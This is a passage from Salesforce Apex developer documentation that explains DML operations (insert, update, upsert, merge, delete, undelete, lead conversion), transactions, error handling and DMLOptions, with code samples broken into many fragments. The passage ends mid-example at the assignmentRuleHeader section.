Also, you can use DML to modify records that have already been inserted. Among the operations you can perform are record updates, deletions, restoring records from the Recycle Bin, merging records, or converting leads. After querying for records, you get sObject instances that you can modify and then persist the changes of. This is an example of querying for an existing record that has been previously persisted, updating a couple of fields on the sObject representation of this record in memory, and then persisting this change to the database.

```apex
// Query existing account.
Account a = [SELECT Name,Industry
FROM Account
WHERE Name='Account Example' LIMIT 1];
```

```apex
// Write the old values the debug log before updating them.
System.debug('Account Name before update: ' + a.Name); // Name is Account Example
System.debug('Account Industry before update: ' + a.Industry);// Industry is not set
```

```apex
// Modify the two fields on the sObject.
a.Name = 'Account of the Day';
a.Industry = 'Technology';
```

```apex
// Persist the changes.
update a;
```

```apex
// Get a new copy of the account from the database with the two fields.
Account a = [SELECT Name,Industry
FROM Account
WHERE Name='Account of the Day' LIMIT 1];
```

```apex
// Verify that updated field values were persisted.
System.assertEquals('Account of the Day', a.Name);
System.assertEquals('Technology', a.Industry);
```

#### DML Statements vs. Database Class Methods

Apex offers two ways to perform DML operations: using DML statements or Database class methods. This provides flexibility in how you perform data operations. DML statements are more straightforward to use and result in exceptions that you can handle in your code. This is an example of a DML statement to insert a new record.

```apex
// Create the list of sObjects to insert
List<Account> acctList = new List<Account>();
acctList.add(new Account(Name='Acme1'));
acctList.add(new Account(Name='Acme2'));
```

```apex
// DML statement
insert acctList;
```

This is an equivalent example to the previous one but it uses a method of the Database class instead of the DML verb.

```apex
// Create the list of sObjects to insert
List<Account> acctList = new List<Account>();
acctList.add(new Account(Name='Acme1'));
acctList.add(new Account(Name='Acme2'));
```

```apex
// DML statement
Database.SaveResult[] srList = Database.insert(acctList, false);
```

```apex
// Iterate through each returned result
for (Database.SaveResult sr : srList) {
```

```apex
if (sr.isSuccess()) {
```

```apex
// Operation was successful, so get the ID of the record that was processed
System.debug('Successfully inserted account. Account ID: ' + sr.getId());
}
else {
```

```apex
// Operation failed, so get all errors
for(Database.Error err : sr.getErrors()) {
System.debug('The following error has occurred.');
System.debug(err.getStatusCode() + ': ' + err.getMessage());
System.debug('Account fields that affected this error: ' + err.getFields());
}
}
}
```

One difference between the two options is that by using the Database class method, you can specify whether or not to allow for partial record processing if errors are encountered. You can do so by passing an additional second Boolean parameter. If you specify `false` for this parameter and if a record fails, the remainder of DML operations can still succeed. Also, instead of exceptions, a result object array (or one result object if only one sObject was passed in) is returned containing the status of each operation and any errors encountered. By default, this optional parameter is `true` , which means that if at least one sObject can’t be processed, all remaining sObjects won’t and an exception will be thrown for the record that causes a failure. The following helps you decide when you want to use DML statements or Database class methods. Use DML statements if you want any error that occurs during bulk DML processing to be thrown as an Apex exception that immediately interrupts control flow (by using `try` `.` `.` `.` `catch` blocks). This behavior is similar to the way exceptions are handled in most database procedural languages. Use Database class methods if you want to allow partial success of a bulk DML operation—if a record fails, the remainder of the DML operation can still succeed. Your application can then inspect the rejected records and possibly retry the operation. When using this form, you can write code that never throws DML exception errors. Instead, your code can use the appropriate results array to judge success or failure. Note that Database methods also include a syntax that supports thrown exceptions, similar to DML statements. Most operations overlap between the two, except for a few. The `convertLead` operation is only available as a Database class method, not as a DML statement. The Database class also provides methods not available as DML statements, such as methods transaction control and rollback, emptying the Recycle Bin, and methods related to SOQL queries. Apex Reference Guide : Database Class Methods

#### DML Operations As Atomic Transactions

DML operations execute within a transaction. All DML operations in a transaction either complete successfully, or if an error occurs in one operation, the entire transaction is rolled back and no data is committed to the database. The boundary of a transaction can be a trigger, a class method, an anonymous block of code, an Apex page, or a custom Web service method. All operations that occur inside the transaction boundary represent a single unit of operations. This also applies to calls that are made from the transaction boundary to external code, such as classes or triggers that get fired as a result of the code running in the transaction boundary. For example, consider the following chain of operations: a custom Apex Web service method calls a method in a class that performs some DML operations. In this case, all changes are committed to the database only after all operations in the transaction finish executing and don’t cause any errors. If an error occurs in any of the intermediate steps, all database changes are rolled back and the transaction isn’t committed.

#### DML Operations

Using DML, you can insert new records and commit them to the database. You can also update the field values of existing records. Inserting and Updating Records Using DML, you can insert new records and commit them to the database. Similarly, you can update the field values of existing records. Upserting Records Merging Records When you have duplicate lead, contact, case, or account records in the database, cleaning up your data and consolidating the records is a good idea. You can merge up to three records of the same sObject type. The `merge` operation merges the duplicate records into the main record, deletes the duplicate records, and reparents any related records. Deleting Records Restoring Deleted Records Converting Leads Using DML, you can insert new records and commit them to the database. Similarly, you can update the field values of existing records. Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain terms to avoid any effect on customer implementations. This example inserts three account records and updates an existing account record. First, three Account sObjects are created and added to a list. An insert statement bulk inserts the list of accounts as an argument. Then, the second account record is updated, the billing city is updated, and the update statement is called to persist the change in the database.

```apex
Account[] accts = new List<Account>();
for(Integer i=0;i<3;i++) {
Account a = new Account(Name='Acme' + i,
BillingCity='San Francisco');
accts.add(a);
}
Account accountToUpdate;
try {
```

```apex
insert accts;
```

```apex
// Update account Acme2.
accountToUpdate =
[SELECT BillingCity FROM Account
WHERE Name='Acme2' AND BillingCity='San Francisco'
LIMIT 1];
// Update the billing city.
accountToUpdate.BillingCity = 'New York';
// Make the update call.
update accountToUpdate;
} catch(DmlException e) {
System.debug('An unexpected error has occurred: ' + e.getMessage());
}
```

```apex
// Verify that the billing city was updated to New York.
Account afterUpdate =
[SELECT BillingCity FROM Account WHERE Id=:accountToUpdate.Id];
System.assertEquals('New York', afterUpdate.BillingCity);
```

Inserting Related Records You can insert records related to existing records if a relationship has already been defined between the two objects, such as a lookup or master-detail relationship. A record is associated with a related record through a foreign key ID. For example, when inserting a new contact, you can specify the contact’s related account record by setting the value of the `AccountId` field. This example adds a contact to an account (the related record) by setting the `AccountId` field on the contact. Contact and Account are linked through a lookup relationship.

```apex
try {
Account acct = new Account(Name='SFDC Account');
insert acct;
```

```apex
// Once the account is inserted, the sObject will be
// populated with an ID.
// Get this ID.
ID acctID = acct.ID;
```

```apex
// Add a contact to this account.
Contact con = new Contact(
FirstName='Joe',
LastName='Smith',
```

```apex
Phone='415.555.1212',
AccountId=acctID);
insert con;
} catch(DmlException e) {
System.debug('An unexpected error has occurred: ' + e.getMessage());
}
```

Updating Related Records Fields on related records can't be updated with the same call to the DML operation and require a separate DML call. For example, if inserting a new contact, you can specify the contact's related account record by setting the value of the `AccountId` field. However, you can't change the account's name without updating the account itself with a separate DML call. Similarly, when updating a contact, if you also want to update the contact’s related account, you must make two DML calls. The following example updates a contact and its related account using two `update` statements.

```apex
try {
```

```apex
// Query for the contact, which has been associated with an account.
Contact queriedContact = [SELECT Account.Name
FROM Contact
WHERE FirstName = 'Joe' AND LastName='Smith'
LIMIT 1];
```

```apex
// Update the contact's phone number
queriedContact.Phone = '415.555.1213';
```

```apex
// Update the related account industry
queriedContact.Account.Industry = 'Technology';
```

```apex
// Make two separate calls
// 1. This call is to update the contact's phone.
update queriedContact;
// 2. This call is to update the related account's Industry field.
update queriedContact.Account;
} catch(Exception e) {
System.debug('An unexpected error has occurred: ' + e.getMessage());
}
```

Relating Records by Using an External ID Add related records by using a custom external ID field on the parent record. Associating records through the external ID field is an alternative to using the record ID. You can add a related record to another record only if a relationship (such as master-detail or lookup) has been defined for the objects involved. Creating Parent and Child Records in a Single Statement Using Foreign Keys Relating Records by Using an External ID Add related records by using a custom external ID field on the parent record. Associating records through the external ID field is an alternative to using the record ID. You can add a related record to another record only if a relationship (such as master-detail or lookup) has been defined for the objects involved. Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain terms to avoid any effect on customer implementations. This example relates a new opportunity to an existing account. The Account sObject has a custom field marked as External ID. An opportunity record is associated to the account record through the custom External ID field. The example assumes that: The Account sObject has an external ID field of type text and named `MyExtID` An account record exists where `MyExtID__c` `=` `‘SAP111111’` Before the new opportunity is inserted, the account record is added to this opportunity as an sObject through the `Opportunity.Account` relationship field.

```apex
Opportunity newOpportunity = new Opportunity(
Name='OpportunityWithAccountInsert',
StageName='Prospecting',
CloseDate=Date.today().addDays(7));
```

```apex
// Create the parent record reference.
// An account with external ID = 'SAP111111' already exists.
// This sObject is used only for foreign key reference
// and doesn't contain any other fields.
Account accountReference = new Account(
MyExtID__c='SAP111111');
```

```apex
// Add the account sObject to the opportunity.
newOpportunity.Account = accountReference;
```

```apex
// Create the opportunity.
Database.SaveResult results = Database.insert(newOpportunity);
```

The previous example performs an insert operation, but you can also relate sObjects through external ID fields when performing updates or upserts. If the parent record doesn’t exist, you can create it with a separate DML statement or by using the same DML statement as shown in Creating Parent and Child Records in a Single Statement Using Foreign Keys . Creating Parent and Child Records in a Single Statement Using Foreign Keys You can use external ID fields as foreign keys to create parent and child records of different sObject types in a single step instead of creating the parent record first, querying its ID, and then creating the child record. To do this: Create the child sObject and populate its required fields, and optionally other fields. Create the parent reference sObject used only for setting the parent foreign key reference on the child sObject. This sObject has only the external ID field defined and no other fields set. Set the foreign key field of the child sObject to the parent reference sObject you just created. Create another parent sObject to be passed to the `insert` statement. This sObject must have the required fields (and optionally other fields) set in addition to the external ID field. Call `insert` by passing it an array of sObjects to create. The parent sObject must precede the child sObject in the array, that is, the array index of the parent must be lower than the child’s index. You can create related records that are up to 10 levels deep. Also, the related records created in a single call must have different sObject types. For more information, see Creating Records for Different Object Types in the SOAP API Developer Guide . The following example shows how to create an opportunity with a parent account using the same `insert` statement. The example creates an Opportunity sObject and populates some of its fields, then creates two Account objects. The first account is only for the foreign key relationship, and the second is for the account creation and has the account fields set. Both accounts have the external ID field, `MyExtID__c` , set. Next, the sample calls `Database.` `insert` by passing it an array of sObjects. The first element in the array is the parent sObject and the second is the opportunity sObject. The `Database.` `insert` statement creates the opportunity with its parent account in a single step. Finally, the sample checks the results and writes the IDs of the created records to the debug log, or the first error if record creation fails. This sample requires an external ID text field on Account called MyExtID.

```apex
public class ParentChildSample {
```

```apex
public static void InsertParentChild() {
```

```apex
Date dt = Date.today();
dt = dt.addDays(7);
Opportunity newOpportunity = new Opportunity(
Name='OpportunityWithAccountInsert',
StageName='Prospecting',
CloseDate=dt);
```

```apex
// Create the parent reference.
// Used only for foreign key reference
// and doesn't contain any other fields.
Account accountReference = new Account(
MyExtID__c='SAP111111');
newOpportunity.Account = accountReference;
```

```apex
// Create the Account object to insert.
// Same as above but has Name field.
// Used for the insert.
Account parentAccount = new Account(
Name='Hallie',
MyExtID__c='SAP111111');
```

```apex
// Create the account and the opportunity.
Database.SaveResult[] results = Database.insert(new SObject[] {
parentAccount, newOpportunity });
```

```apex
// Check results.
for (Integer i = 0; i < results.size(); i++) {
```

```apex
if (results[i].isSuccess()) {
System.debug('Successfully created ID: '
```

```apex
+ results[i].getId());
} else {
System.debug('Error: could not create sobject '
```

```apex
+ 'for array element ' + i + '.');
System.debug('
The error reported was: '
+ results[i].getErrors()[0].getMessage() + '\n');
}
}
}
}
```

Using the `upsert` operation, you can either insert or update an existing record in one call. To determine whether a record already exists, the `upsert` statement or Database method uses the record’s ID as the key to match records, a custom external ID field, or a standard field with the `idLookup` attribute set to true. If the key isn’t matched, then a new object record is created. If the key is matched once, then the existing object record is updated. If the key is matched multiple times, then an error is generated and the object record is not inserted or updated. Custom field matching is case-insensitive only if the custom field has the **Unique** and **Treat "ABC" and "abc" as duplicate** **values (case insensitive)** attributes selected as part of the field definition. If this is the case, “ABC123” is matched with “abc123.” Examples The following example updates the city name for all existing accounts in the city formerly known as Bombay, and also inserts a new account in San Francisco:

```apex
Account[] acctsList = [SELECT Id, Name, BillingCity
FROM Account WHERE BillingCity = 'Bombay'];
for (Account a : acctsList) {
a.BillingCity = 'Mumbai';
}
Account newAcct = new Account(Name = 'Acme', BillingCity = 'San Francisco');
acctsList.add(newAcct);
try {
```

```apex
upsert acctsList;
} catch (DmlException e) {
```

```apex
// Process exception here
}
```

For more information on processing `DmlException` s, see Bulk DML Exception Handling . This next example uses the `Database.` `upsert` method to upsert a collection of leads that are passed in. This example allows for partial processing of records, that is, in case some records fail processing, the remaining records are still inserted or updated. It iterates through the results and adds a task to each record that was processed successfully. The task sObjects are saved in a list, which is then bulk inserted. This example is followed by a test class that contains a test method for testing the example.

```apex
/* This class demonstrates and tests the use of the
* partial processing DML operations */
```

```apex
public class DmlSamples {
```

```apex
/* This method accepts a collection of lead records and
creates a task for the owner(s) of any leads that were
created as new, that is, not updated as a result of the upsert
operation */
public static List<Database.upsertResult> upsertLeads(List<Lead> leads)
{
```

```apex
/* Perform the upsert. In this case the unique identifier for the
insert or update decision is the Salesforce record ID. If the
record ID is null the row will be inserted, otherwise an update
will be attempted. */
List<Database.upsertResult> uResults = Database.upsert(leads,false);
```

```apex
/* This is the list for new tasks that will be inserted when new
leads are created. */
List<Task> tasks = new List<Task>();
for(Database.upsertResult result:uResults) {
```

```apex
if (result.isSuccess() && result.isCreated())
tasks.add(new Task(Subject = 'Follow-up', WhoId = result.getId()));
}
```

```apex
/* If there are tasks to be inserted, insert them */
```

```apex
Database.insert(tasks);
```

```apex
return uResults;
}
}
```

```apex
@isTest
private class DmlSamplesTest {
```

```apex
public static testMethod void testUpsertLeads() {
```

```apex
/* We only need to test the insert side of upsert */
List<Lead> leads = new List<Lead>();
```

```apex
/* Create a set of leads for testing */
for(Integer i = 0;i < 100; i++) {
leads.add(new Lead(LastName = 'testLead', Company = 'testCompany'));
}
```

```apex
/* Switch to the runtime limit context */
Test.startTest();
```

```apex
/* Exercise the method */
List<Database.upsertResult> results = DmlSamples.upsertLeads(leads);
```

```apex
/* Switch back to the test context for limits */
Test.stopTest();
```

```apex
/* ID set for asserting the tasks were created as expected */
Set<Id> ids = new Set<Id>();
```

```apex
/* Iterate over the results, asserting success and adding the new ID
to the set for use in the comprehensive assertion phase below. */
for(Database.upsertResult result:results) {
System.assert(result.isSuccess());
ids.add(result.getId());
}
```

```apex
/* Assert that exactly one task exists for each lead that was inserted. */
for(Lead l:[SELECT Id, (SELECT Subject FROM Tasks) FROM Lead WHERE Id IN :ids]) {
System.assertEquals(1,l.tasks.size());
}
}
}
```

Use of `upsert` with an external ID can reduce the number of DML statements in your code, and help you to avoid hitting governor limits (see Execution Governors and Limits ). This example uses `upsert` and an external ID field `Line_Item_Id__c` on the Asset object to maintain a one-to-one relationship between an asset and an opportunity line item. Before running the sample, create a custom text field on the Asset object named `Line_Item_Id__c` and mark it as an external ID. For information on custom fields, see Salesforce Help. External ID fields used in upsert calls must be unique or the user must have the View All Data permission.

```apex
public void upsertExample() {
Opportunity opp = [SELECT Id, Name, AccountId,
(SELECT Id, PricebookEntry.Product2Id, PricebookEntry.Name
```

```apex
FROM OpportunityLineItems)
FROM Opportunity
WHERE HasOpportunityLineItem = true
LIMIT 1];
```

```apex
Asset[] assets = new Asset[]{};
```

```apex
// Create an asset for each line item on the opportunity
for (OpportunityLineItem lineItem:opp.OpportunityLineItems) {
```

```apex
//This code populates the line item Id, AccountId, and Product2Id for each asset
Asset asset = new Asset(Name = lineItem.PricebookEntry.Name,
Line_Item_ID__c = lineItem.Id,
AccountId = opp.AccountId,
Product2Id = lineItem.PricebookEntry.Product2Id);
```

```apex
assets.add(asset);
}
```

```apex
try {
```

```apex
upsert assets Line_Item_ID__c;
// This line upserts the assets list with
// the Line_Item_Id__c field specified as the
// Asset field that should be used for matching
// the record that should be upserted.
} catch (DmlException e) {
System.debug(e.getMessage());
}
}
```

When you have duplicate lead, contact, case, or account records in the database, cleaning up your data and consolidating the records is a good idea. You can merge up to three records of the same sObject type. The `merge` operation merges the duplicate records into the main record, deletes the duplicate records, and reparents any related records. Use the `merge` Statement This example shows how to merge a duplicate account record into a main account record. The duplicate account has a related contact, which is moved to the main account record after the `merge` operation. After merging, the duplicate record is deleted and only the main record remains in the database.

```apex
// Insert new accounts
List<Account> ls = new List<Account>{
```

```apex
new Account(name='Acme Inc.'),
```

```apex
new Account(name='Acme')
};
insert ls;
```

```apex
// Queries to get the inserted accounts
Account mainAcct = [SELECT Id, Name FROM Account WHERE Name = 'Acme Inc.' LIMIT 1];
Account dupAcct = [SELECT Id, Name FROM Account WHERE Name = 'Acme' LIMIT 1];
```

```apex
// Add a contact to the account to be merged
Contact c = new Contact(FirstName='Joe',LastName='Merged');
c.AccountId = dupAcct.Id;
insert c;
```

```apex
try {
```

```apex
merge mainAcct dupAcct;
} catch (DmlException e) {
```

```apex
// Process exception
System.debug('An unexpected error has occurred: ' + e.getMessage());
}
```

```apex
// After the account is merged with the main account,
// the related contact is moved to the main record.
mainAcct = [SELECT Id, Name, (SELECT FirstName,LastName From Contacts)
FROM Account WHERE Name = 'Acme Inc.' LIMIT 1];
System.assert(mainAcct.getSObjects('Contacts').size() > 0);
System.assertEquals('Joe', mainAcct.getSObjects('Contacts')[0].get('FirstName'));
System.assertEquals('Merged', mainAcct.getSObjects('Contacts')[0].get('LastName'));
```

```apex
// Verify that the duplicate record is deleted
Account[] result = [SELECT Id, Name FROM Account WHERE Id=:dupAcct.Id];
System.assertEquals(0, result.size());
```

Use the `Database.` `merge` Method This second example is similar to the previous example, except that it uses the `Database.` `merge` method instead of the `merge` statement. The last argument of `Database.` `merge` is set to `false` , so any errors encountered in this operation are returned in the merge result without throwing exceptions. In the example, a main account and two duplicate account records are created. One of the duplicate account records has a child contact record. Through the merge operation, the contact is moved to the main account record, and the other records are deleted. To use the AccountContactRelation sObject in this example, enable the “Allow users to relate a contact to multiple accounts” setting in your org. See Set Up Contacts to Multiple Accounts .

```apex
// Create main account
Account main = new Account(Name='Account1');
insert main;
```

```apex
// Create duplicate accounts
Account[] duplicates = new Account[]{
```

```apex
// Duplicate account
new Account(Name='Account1, Inc.'),
// Second duplicate account
new Account(Name='Account 1')
};
insert duplicates;
```

```apex
// Create child contact and associate it with first account
Contact c = new Contact(firstname='Joe',lastname='Smith', accountId=duplicates[0].Id);
insert c;
```

```apex
// Get the account contact relation ID, which is created when a contact is created on
"Account1, Inc."
AccountContactRelation resultAcrel = [SELECT Id FROM AccountContactRelation WHERE
ContactId=:c.Id LIMIT 1];
```

```apex
// Merge duplicate accounts into main account
Database.MergeResult[] results = Database.merge(main, duplicates, false);
```

```apex
for(Database.MergeResult res : results) {
```

```apex
if (res.isSuccess()) {
```

```apex
// Get the main record ID from the result and validate it
System.debug('Main record ID: ' + res.getId());
System.assertEquals(main.Id, res.getId());
```

```apex
// Get the IDs of the merged records and display them
List<Id> mergedIds = res.getMergedRecordIds();
System.debug('IDs of merged records: ' + mergedIds);
```

```apex
// Get the ID of the reparented record and
// validate that this the contact ID.
System.debug('Reparented record ID: ' + res.getUpdatedRelatedIds());
```

```apex
// Make sure there are two IDs (contact ID and account contact relation ID); the order
isn't defined
```

```apex
System.assertEquals(2, res.getUpdatedRelatedIds().size() );
boolean flag1 = false;
boolean flag2 = false;
```

```apex
// Because the order of the IDs isn't defined, the ID can be at index 0 or 1 of the
array
```

```apex
if (resultAcrel.id == res.getUpdatedRelatedIds()[0] || resultAcrel.id ==
res.getUpdatedRelatedIds()[1] )
flag1 = true;
```

```apex
if (c.id == res.getUpdatedRelatedIds()[0] || c.id == res.getUpdatedRelatedIds()[1]
)
flag2 = true;
```

```apex
System.assertEquals(flag1, true);
System.assertEquals(flag2, true);
```

```apex
}
else {
```

```apex
for(Database.Error err : res.getErrors()) {
```

```apex
// Write each error to the debug output
System.debug(err.getMessage());
}
}
}
```

Merge Considerations When merging sObject records, consider these rules and guidelines: Only leads, contacts, cases, and accounts can be merged. See sObjects That Don’t Support DML Operations on page 164. You can pass a main record and up to two additional sObject records to a single `merge` method. Field values on the main record, including null and empty field values, always supersede the corresponding field values on the records to be merged. Therefore, if a field value on the main record is empty, the resulting field value remains empty after the `merge` operation regardless of the field value on the duplicate record. To preserve a field value from a duplicate record, manually set this field value on the main record before performing the merge. External ID fields can’t be used with `merge` . After you persist records in the database, you can delete those records using the `delete` operation. Deleted records aren’t deleted permanently from Salesforce, but they are placed in the Recycle Bin for 15 days from where they can be restored. Restoring deleted records is covered in a later section. Example The following example deletes all accounts that are named 'DotCom':

```apex
Account[] doomedAccts = [SELECT Id, Name FROM Account
WHERE Name = 'DotCom'];
try {
```

```apex
delete doomedAccts;
} catch (DmlException e) {
```

```apex
// Process exception here
}
```

For more information on processing `DmlException` s, see Bulk DML Exception Handling . Referential Integrity When Deleting and Restoring Records The `delete` operation supports cascading deletions. If you delete a parent object, you delete its children automatically, as long as each child record can be deleted. For example, if you delete a case record, Apex automatically deletes any CaseComment, CaseHistory, and CaseSolution records associated with that case. However, if a particular child record is not deletable or is currently being used, then the `delete` operation on the parent case record fails. The `undelete` operation restores the record associations for the following types of relationships: Parent accounts (as specified in the `Parent` `Account` field on an account) Indirect account-contact relationships (as specified on the Related Accounts related list on a contact or the Related Contacts related list on an account) Parent cases (as specified in the `Parent` `Case` field on a case) Master solutions for translated solutions (as specified in the `Master` `Solution` field on a solution) Managers of contacts (as specified in the `Reports` `To` field on a contact) Products related to assets (as specified in the `Product` field on an asset) Opportunities related to quotes (as specified in the `Opportunity` field on a quote) All custom lookup relationships Relationship group members on accounts and relationship groups, with some exceptions Tags An article's categories, publication state, and assignments Salesforce only restores lookup relationships that have not been replaced. For example, if an asset is related to a different product prior to the original product record being undeleted, that asset-product relationship is not restored. After you have deleted records, the records are placed in the Recycle Bin for 15 days, after which they are permanently deleted. While the records are still in the Recycle Bin, you can restore them using the `undelete` operation. If you accidentally deleted some records that you want to keep, restore them from the Recycle Bin. Example The following example undeletes an account named 'Universal Containers'. The `ALL` `ROWS` keyword queries all rows for both top level and aggregate relationships, including deleted records and archived activities.

```apex
Account a = new Account(Name='Universal Containers');
insert(a);
insert(new Contact(LastName='Carter',AccountId=a.Id));
delete a;
```

```apex
Account[] savedAccts = [SELECT Id, Name FROM Account WHERE Name = 'Universal Containers'
ALL ROWS];
try {
```

```apex
undelete savedAccts;
} catch (DmlException e) {
```

```apex
// Process exception here
}
```

For more information on processing `DmlException` s, see Bulk DML Exception Handling . Undelete Considerations Note the following when using the `undelete` statement. You can undelete records that were deleted as the result of a merge. However, the merge reparents the child objects, and that reparenting can’t be undone. To identify deleted records, including records deleted as a result of a merge, use the `ALL` `ROWS` parameters with a SOQL query. See Referential Integrity When Deleting and Restoring Records . Querying All Records with a SOQL Statement The `convertLead` DML operation converts a lead into an account and contact, as well as (optionally) an opportunity. `convertLead` is available only as a method on the `Database` class; it is not available as a DML statement. Converting leads involves the following basic steps: **1.** Your application determines the IDs of any lead(s) to be converted. **2.** Optionally, your application determines the IDs of any account(s) into which to merge the lead. Your application can use SOQL to search for accounts that match the lead name, as in the following example:

```apex
SELECT Id, Name FROM Account WHERE Name='CompanyNameOfLeadBeingMerged'
```

**3.** Optionally, your application determines the IDs of the contact or contacts into which to merge the lead. The application can use SOQL to search for contacts that match the lead contact name, as in the following example:

```apex
SELECT Id, Name FROM Contact WHERE FirstName='FirstName' AND LastName='LastName' AND
AccountId = '001...'
```

**4.** Optionally, the application determines whether opportunities should be created from the leads. **5.** The application uses the query ( `SELECT` `...` `FROM` `LeadStatus` `WHERE` `IsConverted=` `true` ) to obtain the leads with converted status. **6.** The application calls `convertLead` . **7.** The application iterates through the returned result or results and examines each LeadConvertResult object to determine whether conversion succeeded for each lead. **8.** Optionally, when converting leads owned by a queue, the owner must be specified. This is because accounts and contacts can’t be owned by a queue. Even if you are specifying an existing account or contact, you must still specify an owner. Example This example shows how to use the `Database.convertLead` method to convert a lead. It inserts a new lead, creates a `LeadConvert` object, sets its status to converted, and then passes it to the `Database.convertLead` method. Finally, it verifies that the conversion was successful.

```apex
Lead myLead = new Lead(LastName = 'Fry', Company='Fry And Sons');
insert myLead;
```

```apex
Database.LeadConvert lc = new database.LeadConvert();
lc.setLeadId(myLead.id);
```

```apex
LeadStatus convertStatus = [SELECT Id, ApiName FROM LeadStatus WHERE IsConverted=true LIMIT
1];
lc.setConvertedStatus(convertStatus.ApiName);
```

```apex
Database.LeadConvertResult lcr = Database.convertLead(lc);
System.assert(lcr.isSuccess());
```

Convert Leads Considerations Field mappings: The system automatically maps standard lead fields to standard account, contact, and opportunity fields. For custom lead fields, your Salesforce administrator can specify how they map to custom account, contact, and opportunity fields. For more information about field mappings, see Salesforce Help. Merged fields: If data is merged into existing account and contact objects, only empty fields in the target object are overwritten—existing data (including IDs) are not overwritten. The only exception is if you specify `setOverwriteLeadSource` on the LeadConvert object to true, in which case the `LeadSource` field in the target contact object is overwritten with the contents of the `LeadSource` field in the source LeadConvert object. Record types: If the organization uses record types, the default record type of the new owner is assigned to records created during lead conversion. The default record type of the user converting the lead determines the lead source values available during conversion. If the desired lead source values are not available, add the values to the default record type of the user converting the lead. For more information about record types, see Salesforce Help. Picklist values: The system assigns the default picklist values for the account, contact, and opportunity when mapping any standard lead picklist fields that are blank. If your organization uses record types, blank values are replaced with the default picklist values of the new record owner. Automatic feed subscriptions: When you convert a lead into a new account, contact, and opportunity, the lead owner is unsubscribed from the lead record’s Chatter feed. The lead owner, the owner of the generated records, and users that were subscribed to the lead aren’t automatically subscribed to the generated records, unless they have automatic subscriptions enabled in their Chatter feed settings. They must have automatic subscriptions enabled to see changes to the account, contact, and opportunity records in their news feed. To subscribe to records they create, users must enable the `Automatically` `follow` `records` `that` `I` `create` option in their personal settings. A user can subscribe to a record so that changes to the record display in the news feed on the user's home page. This is a useful way to stay up-to-date with changes to records in Salesforce. Apex Reference Guide : Database Class

#### Exception Handling

DML statements return run-time exceptions if something went wrong in the database during the execution of the DML operations. You can handle the exceptions in your code by wrapping your DML statements within try-catch blocks. The following example includes the `insert` DML statement inside a try-catch block.

```apex
Account a = new Account(Name='Acme');
try {
```

```apex
insert a;
} catch(DmlException e) {
```

```apex
// Process exception here
}
```

Database Class Method Result Objects Returned Database Errors Database class methods return the results of the data operation. These result objects contain useful information about the data operation for each record, such as whether the operation was successful or not, and any error information. Each type of operation returns a specific result object type, as outlined below. SaveResult Class insert, update UpsertResult Class upsert MergeResult Class merge DeleteResult Class delete UndeleteResult Class undelete LeadConvertResult Class convertLead EmptyRecycleBinResult Class emptyRecycleBin While DML statements always return exceptions when an operation fails for one of the records being processed and the operation is rolled back for all records, Database class methods can either do so or allow partial success for record processing. In the latter case of partial processing, Database class methods don’t throw exceptions. Instead, they return a list of errors for any errors that occurred on failed records. The errors provide details about the failures and are contained in the result of the Database class method. For example, a `SaveResult` object is returned for insert and update operations. Like all returned results, `SaveResult` contains a method called `getErrors` that returns a list of `Database.Error` objects, representing the errors encountered, if any. Example This example shows how to get the errors returned by a `Database.insert` operation. It inserts two accounts, one of which doesn’t have the required Name field, and sets the second parameter to `false` : `Database.insert(accts,` `false);` . This sets the partial processing option. Next, the example checks if the call had any failures through `if` `(!sr.isSuccess())` and then iterates through the errors, writing error information to the debug log.

```apex
// Create two accounts, one of which is missing a required field
Account[] accts = new List<Account>{
```

```apex
new Account(Name='Account1'),
new Account()};
Database.SaveResult[] srList = Database.insert(accts, false);
```

```apex
// Iterate through each returned result
for (Database.SaveResult sr : srList) {
```

```apex
if (!sr.isSuccess()) {
```

```apex
// Operation failed, so get all errors
for(Database.Error err : sr.getErrors()) {
System.debug('The following error has occurred.');
System.debug(err.getStatusCode() + ': ' + err.getMessage());
System.debug('Fields that affected this error: ' + err.getFields());
}
}
}
```

#### More About DML

Here are some things you may want to know about using Data Manipulation Language. Setting DML Options You can specify DML options for insert and update operations by setting the desired options in the `Database.DMLOptions` object. You can set `Database.DMLOptions` for the operation by calling the `setOptions` method on the sObject, or by passing it as a parameter to the `Database.` `insert` and `Database.` `update` methods. Transaction Control Read about transaction requests, generating and releasing savepoints, rolling back transactions, and more. sObjects That Can’t Be Used Together in DML Operations DML operations on certain sObjects, sometimes referred to as setup objects, can’t be mixed with DML on non-setup sObjects in the same transaction. This restriction exists because some sObjects affect the user’s access to records in the org. You must insert or update these types of sObjects in a different transaction to prevent operations from happening with incorrect access-level permissions. For example, you can’t update an account and a user role in a single transaction. sObjects That Don’t Support DML Operations Bulk DML Exception Handling Things You Should Know about Data in Apex You can specify DML options for insert and update operations by setting the desired options in the `Database.DMLOptions` object. You can set `Database.DMLOptions` for the operation by calling the `setOptions` method on the sObject, or by passing it as a parameter to the `Database.` `insert` and `Database.` `update` methods. Using DML options, you can specify: The truncation behavior of fields. Assignment rule information. Duplicate rule information. Whether automatic emails are sent. The user locale for labels. Whether the operation allows for partial success. The `Database.DMLOptions` class has the following properties: `allowFieldTruncation` Property `assignmentRuleHeader` Property

```apex
•
duplicateRuleHeader
```

`emailHeader` Property `localeOptions` Property `optAllOrNone` Property DMLOptions is only available for Apex saved against API versions 15.0 and higher. DMLOptions settings take effect only for record operations performed using Apex DML and not through the Salesforce user interface. `allowFieldTruncation` Property The `allowFieldTruncation` property specifies the truncation behavior of strings. In Apex saved against API versions previous to 15.0, if you specify a value for a string and that value is too large, the value is truncated. For API version 15.0 and later, if a value is specified that is too large, the operation fails and an error message is returned. The `allowFieldTruncation` property allows you to specify that the previous behavior, truncation, be used instead of the new behavior in Apex saved against API versions 15.0 and later. The `allowFieldTruncation` property takes a Boolean value. If `true` , the property truncates String values that are too long, which is the behavior in API versions 14.0 and earlier. For example:

```apex
Database.DMLOptions dml = new Database.DMLOptions();
```

```apex
dml.allowFieldTruncation = true;
```

`assignmentRuleHeader` Property The `assignmentRuleHeader` property specifies the assignment rule to be used when creating a case or lead. The Database.DMLOptions object supports assignment rules for cases and leads, but not for accounts. Using the `assignmentRuleHeader` property, you can set these options: `assignmentRuleID` : The ID of an assignment rule for the case or lead. The assignment rule can be active or inactive. The ID can be retrieved by querying the AssignmentRule sObject. If specified, do not specify `useDefaultRule` . If the value is not in the correct ID format (15-character or 18-character Salesforce ID), the call fails and an exception is returned. `useDefaultRule` : Indicates whether the default (active) assignment rule will be used for a case or lead. If specified, do not specify an `assignmentRuleId` . The following example uses the `useDefaultRule` option:

```apex
